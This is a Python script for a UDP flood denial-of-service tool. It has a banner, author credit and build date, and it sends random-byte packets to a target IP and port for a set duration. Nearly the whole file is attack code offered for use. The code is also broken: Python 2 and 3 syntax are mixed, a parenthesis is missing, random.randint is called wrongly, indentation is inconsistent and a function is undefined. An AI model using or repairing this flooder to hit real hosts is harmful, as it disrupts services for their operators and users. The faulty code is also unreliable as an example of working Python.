import os, sys, time, threading, socket, random
from time import time as tt

def clear():
	os.system('cls' if os.name=='nt' else 'clear')

def running(s):
	try:
		for c in s + '\n':
        	    sys.stdout.write(c)
	            sys.stdout.flush()
	            time.sleep(0.001)
	except (KeyboardInterrupt,EOFError):
		run('Error!!')

def usage():
	running("usage : python3 xvx.py [ip] [port] [time] [size]")

def attacking():
    clear()
    print("\033[94m╔═════════════════════════════════════════════════════════╗")
    print("\033[94m║\033[91m           ╔═══╗╔╗─╔╗──────╔╗──╔═══╗─────╔╗              \033[94m║")
    print("\033[94m║\033[91m           ║╔═╗╠╝╚╦╝╚╗─────║║──║╔═╗║────╔╝╚╗             \033[94m║")
    print("\033[94m║\033[91m           ║║─║╠╗╔╩╗╔╬══╦══╣║╔╗║╚══╦══╦═╬╗╔╝             \033[94m║")
    print("\033[94m║\033[91m           ║╚═╝║║║─║║║╔╗║╔═╣╚╝╝╚══╗║║═╣╔╗╣║              \033[94m║")
    print("\033[94m║\033[91m           ║╔═╗║║╚╗║╚╣╔╗║╚═╣╔╗╗║╚═╝║║═╣║║║╚╗             \033[94m║")
    print("\033[94m║\033[91m           ╚╝─╚╝╚═╝╚═╩╝╚╩══╩╝╚╝╚═══╩══╩╝╚╩═╝             \033[94m║")
    print("\033[94m╚═══════╦══════════════════════════════════════════╦══════╝")
    print("\033[94m╔═══════╩════════════════════╦═════════════════════╩══════╗")
    print("\033[94m║ \033[91mBimzzxTheNextGenerations.  \033[94m║ \033[91mToolsBuildAt : 17/05/22.   \033[94m║")
    print("\033[94m╚════════════════════════════╩════════════════════════════╝")

def attack(ip, port, time, size):
    if time is None:
        time = float('inf')
    if port is not None:
        port = max(1, min(65535, port))
    attacking()
    fmt = '\033[94m[ ク ]  -  ATTACK SENT TO IP \033[91m{ip}\033[94m AND PORT \033[91m{port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)
    startup = tt()
    size = os.urandom(min(666, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        port = port or random.randint(1,666, 65535, 3354, 7777, 8888)
        endtime = tt()
        if (startup + time) < endtime:
            break
        sock.sendto(size, (ip, port))
    print('\033[92mAttack Finished')
    clear()


def main():
    print len(sys.argv)
    if len(sys.argv) != 5:
        usage()
    else:
        attack(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\033[32mAttack stopped.")
        clear()